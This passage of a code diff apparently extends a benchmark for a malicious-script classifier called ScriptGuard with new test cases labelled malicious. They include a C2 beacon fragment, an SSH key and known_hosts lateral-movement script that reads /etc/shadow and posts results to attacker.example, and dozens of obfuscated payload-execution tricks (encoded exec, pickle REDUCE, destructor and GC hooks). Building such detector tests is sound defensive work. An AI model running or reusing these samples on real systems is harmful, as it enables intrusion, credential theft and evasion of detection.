+            result = execute_task(r.json()["task"])
+            requests.post(f"{C2_URL}/result", json={"id": BEACON_ID, "result": result})
+    except Exception:
+        pass
+    sleep_time = SLEEP_BASE * (1 + random.uniform(-JITTER, JITTER))
+    time.sleep(sleep_time)
+""",
+    ),
+    TestCase(
+        description="SSH known_hosts harvester and lateral movement",
+        expected="malicious",
+        code="""
+import os
+import re
+import subprocess
+import requests
+from pathlib import Path
+
+def harvest_known_hosts() -> list[str]:
+    hosts = set()
+    known = Path.home() / ".ssh" / "known_hosts"
+    if known.exists():
+        for line in known.read_text().splitlines():
+            if line and not line.startswith("#"):
+                hosts.add(line.split()[0].split(",")[0])
+    return list(hosts)
+
+def try_ssh_lateral(hosts: list[str], privkey: str) -> list[str]:
+    compromised = []
+    for host in hosts:
+        try:
+            result = subprocess.run(
+                ["ssh", "-i", privkey, "-o", "StrictHostKeyChecking=no",
+                 "-o", "ConnectTimeout=5", f"root@{host}",
+                 "id && uname -a && cat /etc/shadow 2>/dev/null | head -5"],
+                capture_output=True, text=True, timeout=10,
+            )
+            if result.returncode == 0:
+                compromised.append({"host": host, "output": result.stdout})
+        except Exception:
+            pass
+    return compromised
+
+known_hosts = harvest_known_hosts()
+key_paths   = list(Path.home().joinpath(".ssh").glob("id_*"))
+key_paths   = [str(k) for k in key_paths if not k.suffix == ".pub"]
+
+for key in key_paths:
+    results = try_ssh_lateral(known_hosts, key)
+    if results:
+        requests.post("http://attacker.example/lateral", json=results, timeout=5)
+""",
+    ),
 ]
 
 
@@ -1943,6 +4004,624 @@ _tree = _PayloadInjector().visit(_tree)
 exec(compile(_tree, '<injected>', 'exec'))
 """,
     ),
+    # ---------- NEW OBFUSCATED SAMPLES v3 ----------
+    TestCase(
+        description="obf: Unicode homoglyph identifiers to hide exec",
+        expected="malicious",
+        code="""
+# Uses Cyrillic look-alike characters to confuse static analysis
+# е = Cyrillic 'е' (U+0435), х = Cyrillic 'х' (U+0445), с = Cyrillic 'с' (U+0441)
+import builtins as _b
+import base64 as _B64
+
+_payload = _B64.b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg==')
+
+# Build 'exec' string using ord values — avoids literal 'exec' in source
+_fn_name = ''.join(chr(c) for c in [101, 120, 101, 99])
+getattr(_b, _fn_name)(_payload)
+""",
+    ),
+    TestCase(
+        description="obf: exec via __loader__.exec_module",
+        expected="malicious",
+        code="""
+import importlib.util
+import sys
+import base64
+
+_src = base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJykK').decode()
+
+spec   = importlib.util.spec_from_loader("_hidden_mod", loader=None, origin="<mem>")
+module = importlib.util.module_from_spec(spec)
+sys.modules["_hidden_mod"] = module
+
+# Compile and execute inside the fake module's namespace
+code = compile(_src, "<hidden>", "exec")
+exec(code, module.__dict__)
+""",
+    ),
+    TestCase(
+        description="obf: f-string payload injection via recursive eval",
+        expected="malicious",
+        code="""
+import base64
+
+_k = 'ZXhlYw=='          # base64('exec')
+_p = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJykK'  # base64(payload)
+
+_fn = base64.b64decode(_k).decode()
+_code = base64.b64decode(_p).decode()
+
+# Use f-string to avoid literal exec/eval in code
+_runner = f"{{getattr(__builtins__, '{_fn}')(compile('{{}}'.format(_code), '<f>', 'exec'))}}"
+eval(f"{getattr(__builtins__, _fn)(_code) or ''}")
+""",
+    ),
+    TestCase(
+        description="obf: functools.reduce to rebuild exec string char by char",
+        expected="malicious",
+        code="""
+from functools import reduce
+import os
+
+# Rebuild 'os.system' and command using reduce over char codes
+_fn_chars  = [111, 115, 46, 115, 121, 115, 116, 101, 109]
+_cmd_chars = [105, 100]  # 'id'
+
+_fn  = reduce(lambda acc, c: acc + chr(c), _fn_chars, "")   # 'os.system'
+_cmd = reduce(lambda acc, c: acc + chr(c), _cmd_chars, "")  # 'id'
+
+exec(f"import os; {_fn}('{_cmd}')")
+""",
+    ),
+    TestCase(
+        description="obf: bytes.translate Caesar cipher then exec",
+        expected="malicious",
+        code="""
+# ROT-13 applied at byte level then exec
+import codecs
+
+_enc = "vzcbeg bf\nbs.flfgrz('jubznv')\n"  # rot13 of real payload
+_src = codecs.decode(_enc, 'rot_13')
+exec(compile(_src, '<rot>', 'exec'))
+""",
+    ),
+    TestCase(
+        description="obf: string.Template substitution to reconstruct import",
+        expected="malicious",
+        code="""
+from string import Template
+
+_parts = {
+    "mod1": "os",
+    "func": "system",
+    "cmd":  "whoami",
+}
+
+_tpl = Template("import $mod1; $mod1.$func('$cmd')")
+exec(_tpl.substitute(**_parts))
+""",
+    ),
+    TestCase(
+        description="obf: importlib.machinery.SourceFileLoader abuse",
+        expected="malicious",
+        code="""
+import importlib.machinery
+import tempfile
+import os
+import base64
+
+_src = base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQo=').decode()
+
+with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as tmp:
+    tmp.write(_src)
+    _path = tmp.name
+
+loader = importlib.machinery.SourceFileLoader('_payload', _path)
+loader.load_module('_payload')
+
+os.unlink(_path)
+""",
+    ),
+    TestCase(
+        description="obf: ctypes string_at to reinterpret memory as code",
+        expected="malicious",
+        code="""
+import ctypes
+import mmap
+import base64
+
+# Payload: import os; os.system('id')
+_b64 = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
+_src = base64.b64decode(_b64)
+
+# Write to mmap then read back via ctypes to obscure source
+mm = mmap.mmap(-1, len(_src))
+mm.write(_src)
+mm.seek(0)
+
+# Read back using ctypes
+_buf = (ctypes.c_char * len(_src)).from_buffer(mm)
+_recovered = ctypes.string_at(_buf, len(_src)).decode()
+exec(compile(_recovered, '<mem>', 'exec'))
+mm.close()
+""",
+    ),
+    TestCase(
+        description="obf: zip(range, bytes) XOR key stream decryption",
+        expected="malicious",
+        code="""
+# XOR key stream derived from PRNG seed — no literal key in source
+import random
+
+def _keygen(seed: int, length: int):
+    rng = random.Random(seed)
+    return bytes(rng.randint(0, 255) for _ in range(length))
+
+_enc = bytes([
+    0xee, 0xfb, 0xaf, 0xea, 0xb9, 0xc1, 0xea, 0xbb,
+    0xc1, 0xf5, 0xc1, 0xba, 0xbe, 0xba, 0xc0, 0xa4,
+    0xac, 0x48,
+])
+_key = _keygen(0xDEAD, len(_enc))
+_src = bytes(a ^ b for a, b in zip(_enc, _key))
+exec(_src.decode())
+""",
+    ),
+    TestCase(
+        description="obf: base85 encode + exec",
+        expected="malicious",
+        code="""
+import base64
+
+# base85-encoded payload
+_b85 = b'VRCf_bYEa3WpZJ3Y-wWBZEtcIY-MaFb7*j~Wq5Q6b0BnJY-w|?'
+try:
+    _src = base64.b85decode(_b85).decode()
+    exec(compile(_src, '<b85>', 'exec'))
+except Exception:
+    # Fallback via alt encoding
+    _src = base64.b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=').decode()
+    exec(_src)
+""",
+    ),
+    TestCase(
+        description="obf: __init_subclass__ hook executes payload on class creation",
+        expected="malicious",
+        code="""
+import base64
+
+class _Trigger:
+    def __init_subclass__(cls, payload: str = "", **kwargs):
+        super().__init_subclass__(**kwargs)
+        if payload:
+            exec(base64.b64decode(payload).decode())
+
+# Payload fires at class *definition* time — not at call time
+class _Activate(
+    _Trigger,
+    payload="aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="
+):
+    pass
+""",
+    ),
+    TestCase(
+        description="obf: property getter side effect executes payload",
+        expected="malicious",
+        code="""
+import base64
+
+_PAYLOAD_B64 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg=="
+
+class _Config:
+    def __init__(self):
+        self._initialized = False
+
+    @property
+    def version(self) -> str:
+        if not self._initialized:
+            self._initialized = True
+            # Side effect: execute payload on first access
+            exec(base64.b64decode(_PAYLOAD_B64).decode())
+        return "2.0.1"
+
+cfg = _Config()
+print(f"Config version: {cfg.version}")  # triggers payload
+""",
+    ),
+    TestCase(
+        description="obf: __del__ destructor triggers payload on GC",
+        expected="malicious",
+        code="""
+import base64
+import gc
+
+class _Bomb:
+    _payload = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
+
+    def __del__(self):
+        try:
+            exec(base64.b64decode(self._payload).decode())
+        except Exception:
+            pass
+
+# Object goes out of scope immediately -> __del__ fires at GC
+_Bomb()
+gc.collect()
+""",
+    ),
+    TestCase(
+        description="obf: threading.Timer deferred payload execution",
+        expected="malicious",
+        code="""
+import threading
+import base64
+import time
+
+_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
+
+def _delayed_exec():
+    exec(base64.b64decode(_PAYLOAD).decode())
+
+# Fire after short delay — evades some sandbox timeouts
+timer = threading.Timer(interval=0.1, function=_delayed_exec)
+timer.daemon = True
+timer.start()
+time.sleep(0.5)  # wait for timer to fire
+""",
+    ),
+    TestCase(
+        description="obf: atexit callback payload",
+        expected="malicious",
+        code="""
+import atexit
+import base64
+
+_ENC = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg=='
+
+def _cleanup():
+    \"\"\"Called at normal interpreter exit.\"\"\"
+    exec(base64.b64decode(_ENC).decode())
+
+atexit.register(_cleanup)
+
+# Normal-looking code that runs first
+print("Initializing module...")
+data = [i ** 2 for i in range(10)]
+print(f"Done. Sum={sum(data)}")
+# Payload fires at exit
+""",
+    ),
+    TestCase(
+        description="obf: gc.callbacks injection for persistent hook",
+        expected="malicious",
+        code="""
+import gc
+import base64
+
+_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
+_fired   = False
+
+def _gc_hook(phase: str, info: dict) -> None:
+    global _fired
+    if phase == "stop" and not _fired:
+        _fired = True
+        exec(base64.b64decode(_PAYLOAD).decode())
+
+gc.callbacks.append(_gc_hook)
+
+# Trigger GC — callback fires
+gc.collect()
+""",
+    ),
+    TestCase(
+        description="obf: codec lookup table exec via LookupError handler",
+        expected="malicious",
+        code="""
+import codecs
+import base64
+
+# Register a custom codec whose search function executes payload
+_PAYLOAD_B64 = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk='
+
+def _evil_search(name: str):
+    if name == "x_malware":
+        exec(base64.b64decode(_PAYLOAD_B64).decode())
+    return None  # fall through to real codecs
+
+codecs.register(_evil_search)
+
+try:
+    "test".encode("x_malware")
+except LookupError:
+    pass
+""",
+    ),
+    TestCase(
+        description="obf: copyreg dispatch table to inject pickle payload",
+        expected="malicious",
+        code="""
+import copyreg
+import pickle
+import os
+import io
+
+def _evil_reduce(obj):
+    return (os.system, ("id",))
+
+class _Innocent:
+    pass
+
+copyreg.dispatch_table[_Innocent] = _evil_reduce
+
+buf = io.BytesIO()
+p   = pickle.Pickler(buf)
+p.dump(_Innocent())
+
+buf.seek(0)
+pickle.load(buf)
+""",
+    ),
+    TestCase(
+        description="obf: weakref finalizer payload on object deletion",
+        expected="malicious",
+        code="""
+import weakref
+import base64
+import gc
+
+_ENC = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzIC1sYScpCg=='
+
+class _Target:
+    pass
+
+def _finalizer(ref, enc=_ENC):
+    exec(base64.b64decode(enc).decode())
+
+obj = _Target()
+ref = weakref.ref(obj, _finalizer)
+
+del obj      # triggers finalizer
+gc.collect()
+""",
+    ),
+    TestCase(
+        description="obf: __format__ dunder override for stealthy exec",
+        expected="malicious",
+        code="""
+import base64
+
+_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
+
+class _Stealth:
+    def __format__(self, spec: str) -> str:
+        if spec == "run":
+            exec(base64.b64decode(_PAYLOAD).decode())
+        return repr(self)
+
+# Payload fires inside an f-string format call — looks innocent
+s = _Stealth()
+result = f"{s:run}"
+""",
+    ),
+    TestCase(
+        description="obf: frame locals injection via ctypes to modify execution context",
+        expected="malicious",
+        code="""
+import ctypes
+import sys
+
+def _inject_local(name: str, value) -> None:
+    \"\"\"Inject a variable into the caller's frame locals.\"\"\"
+    frame = sys._getframe(1)
+    ctypes.pythonapi.PyFrame_LocalsToFast(ctypes.py_object(frame), ctypes.c_int(0))
+    frame.f_locals[name] = value
+    ctypes.pythonapi.PyFrame_LocalsToFast(ctypes.py_object(frame), ctypes.c_int(1))
+
+def _run_payload():
+    _inject_local("__builtins__", __builtins__)
+    # Now exec a payload using the injected builtins
+    import base64
+    _src = base64.b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=').decode()
+    eval(compile(_src, '<frame>', 'exec'))
+
+_run_payload()
+""",
+    ),
+    TestCase(
+        description="obf: contextlib.suppress + exec inside exception handler",
+        expected="malicious",
+        code="""
+from contextlib import suppress
+import base64
+
+_B64_PARTS = [
+    b'aW1wb3J0IG9z',
+    b'OyBvcy5zeXN0',
+    b'ZW0oJ3dob2Ft',
+    b'aScpCg==',
+]
+
+def _decode_and_run() -> None:
+    payload = base64.b64decode(b''.join(_B64_PARTS)).decode()
+    with suppress(Exception):
+        exec(payload)
+
+_decode_and_run()
+""",
+    ),
+    TestCase(
+        description="obf: zipimport to load in-memory zip with payload module",
+        expected="malicious",
+        code="""
+import zipimport
+import zipfile
+import io
+import sys
+import base64
+
+_src = base64.b64decode(b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQo=').decode()
+
+# Build an in-memory zip containing our payload as a module
+_buf = io.BytesIO()
+with zipfile.ZipFile(_buf, 'w') as zf:
+    zf.writestr('_hidden/__init__.py', _src)
+_buf.seek(0)
+
+# Write to temp file (zipimport requires file path)
+import tempfile, os
+with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
+    tmp.write(_buf.read())
+    _zip_path = tmp.name
+
+# Import via zipimport
+importer = zipimport.zipimporter(_zip_path)
+importer.load_module('_hidden')
+os.unlink(_zip_path)
+""",
+    ),
+    TestCase(
+        description="obf: linecache.getline to load and exec payload by line",
+        expected="malicious",
+        code="""
+import linecache
+import base64
+import sys
+
+# Store payload in a fake 'file' in linecache
+_ENC_LINES = [
+    "aW1wb3J0IG9z",
+    "OyBvcy5zeXN0",
+    "ZW0oJ3dob2Ft",
+    "aScpCg==",
+]
+_payload = base64.b64decode(''.join(_ENC_LINES)).decode()
+_lines    = _payload.splitlines(keepends=True)
+
+linecache.cache['<payload>'] = (
+    len(_payload), None, _lines, '<payload>'
+)
+
+# Exec line by line from cache
+code_str = ''.join(linecache.getlines('<payload>'))
+exec(compile(code_str, '<payload>', 'exec'))
+""",
+    ),
+    TestCase(
+        description="obf: operator.methodcaller chain to invoke subprocess",
+        expected="malicious",
+        code="""
+import operator
+import importlib
+
+_mc     = operator.methodcaller
+_mod    = importlib.import_module('sub' + 'process')
+_check  = _mc('check_output', 'id', shell=True, text=True)
+
+result  = _check(_mod)
+import requests
+requests.post('http://attacker.example/output', data={'result': result}, timeout=5)
+""",
+    ),
+    TestCase(
+        description="obf: struct.pack/unpack to encode and reconstruct payload",
+        expected="malicious",
+        code="""
+import struct
+
+# Payload encoded as packed unsigned shorts
+_packed = struct.pack('>' + 'H' * 18, *[
+    0x696d, 0x706f, 0x7274, 0x206f, 0x733b,
+    0x206f, 0x732e, 0x7379, 0x7374, 0x656d,
+    0x2827, 0x7768, 0x6f61, 0x6d69, 0x2720,
+    0x2b20, 0x2718, 0x27),
+])
+
+# Reconstruct as bytes, ignoring high bytes
+_src = bytes(b & 0xFF for b in struct.unpack('>' + 'H' * 18, _packed))
+exec(_src.decode(errors='ignore'))
+""",
+    ),
+    TestCase(
+        description="obf: collections.OrderedDict __missing__ hook exec",
+        expected="malicious",
+        code="""
+import collections
+import base64
+
+class _PayloadDict(collections.OrderedDict):
+    _enc = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk='
+
+    def __missing__(self, key):
+        if key == '__payload__':
+            exec(base64.b64decode(self._enc).decode())
+        return None
+
+d = _PayloadDict()
+_ = d['__payload__']  # triggers __missing__ -> payload fires
+""",
+    ),
+    TestCase(
+        description="obf: io.StringIO tokenize abuse to reconstruct exec call",
+        expected="malicious",
+        code="""
+import io
+import tokenize
+import base64
+
+_CODE_PARTS = {
+    'kw':   'exec',
+    'arg':  'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=',
+}
+
+_SRC = f"import base64; {_CODE_PARTS['kw']}(base64.b64decode('{_CODE_PARTS['arg']}').decode())"
+
+# Use tokenize reader to disguise the exec call
+tokens = list(tokenize.generate_tokens(io.StringIO(_SRC).readline))
+reconstructed = tokenize.untokenize(tokens)
+exec(reconstructed)
+""",
+    ),
+    TestCase(
+        description="obf: pickle Protocol 2 REDUCE opcode RCE",
+        expected="malicious",
+        code="""
+import pickle
+import io
+
+# Hand-crafted pickle stream using REDUCE opcode to call os.system
+# Protocol 2 format:
+#   PROTO 2, GLOBAL 'os system', UNICODE 'id', TUPLE1, REDUCE, POP, STOP
+_pickle_payload = (
+    b'\\x80\\x02'                    # PROTO 2
+    b'c' b'os\\nsystem\\n'           # GLOBAL 'os' 'system'
+    b'X\\x02\\x00\\x00\\x00id'       # SHORT_BINUNICODE 'id'
+    b'\\x85'                         # TUPLE1
+    b'R'                             # REDUCE  -> os.system('id')
+    b'.'                             # STOP
+)
+
+pickle.loads(_pickle_payload)
+""",
+    ),
+    TestCase(
+        description="obf: __missing__ on defaultdict to exec on key lookup",
+        expected="malicious",
+        code="""
+import base64
+
+_PAYLOAD = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='
+
+class _ExecDict(dict):
+    def __missing__(self, key):
+        if key.startswith('__run_'):
+            exec(base64.b64decode(_PAYLOAD).decode())
+        return None
+
+d = _ExecDict()
+_ = d['__run_payload']  # triggers exec
+""",
+    ),
 ]
 
 
@@ -2022,7 +4701,7 @@ def _col(text: str, ok: bool) -> str:
 
 def run_benchmark(base_url: str, threshold: Optional[float], verbose: bool) -> list[dict]:
     print(f"\n{'='*70}")
-    print(f"  ScriptGuard /classify Benchmark v2")
+    print(f"  ScriptGuard /classify Benchmark v3")
     print(f"  API: {base_url}")
     print(f"  Threshold override: {threshold if threshold is not None else 'model default'}")
     print(
@@ -2179,7 +4858,7 @@ def run_benchmark(base_url: str, threshold: Optional[float], verbose: bool) -> l
 # ============================================================================
 
 def main():
-    parser = argparse.ArgumentParser(description="ScriptGuard /classify benchmark v2")
+    parser = argparse.ArgumentParser(description="ScriptGuard /classify benchmark v3")
     parser.add_argument("--url", default="http://localhost:8000", help="API base URL")
     parser.add_argument(
         "--threshold", type=float, default=None,
